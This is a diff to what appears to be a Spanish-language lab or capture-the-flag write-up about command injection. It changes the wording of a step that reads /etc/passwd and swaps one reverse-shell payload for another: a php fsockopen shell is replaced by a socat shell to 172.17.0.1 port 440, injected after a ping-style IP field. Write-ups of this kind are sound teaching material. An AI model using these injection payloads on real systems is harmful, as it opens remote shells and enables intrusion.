@@ -84,7 +84,7 @@ La aplicación intenta filtrar determinados caracteres, pero no implementa una s
 <img width="1355" height="954" alt="6blacklist" src="https://github.com/user-attachments/assets/ce10cc47-bba6-42b4-a06a-ba411b5f169d" />
 <br><br>
 
-Leemos el archivo /etc/passwd para ver que usuarios existen y si hay alguna contraseña en él que podamos aprovechar. Solo está el usuario root.
+Leemos el archivo /etc/passwd para identificar las cuentas que existen y localizar posibles usuarios de los que podamos aprovecharnos. Encontramos las cuentas del sistema y el usuario root.
 
 
 <img width="1262" height="956" alt="7passwd" src="https://github.com/user-attachments/assets/babc8dca-115b-4ff5-9cce-d5c51828fe71" />
@@ -137,7 +137,7 @@ Establecemos una *reverse shell* hacia nuestra máquina atacante:
 
 ```php
 # Comando ejecutado en el navegador web
-127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
+127.0.0. || socat TCP:172.17.0.1:440 exec:/bin/bash
 ```
 <img width="1436" height="904" alt="revel" src="https://github.com/user-attachments/assets/13f6b506-7ae6-470e-bd11-2cf366601985" />
 <br><br>
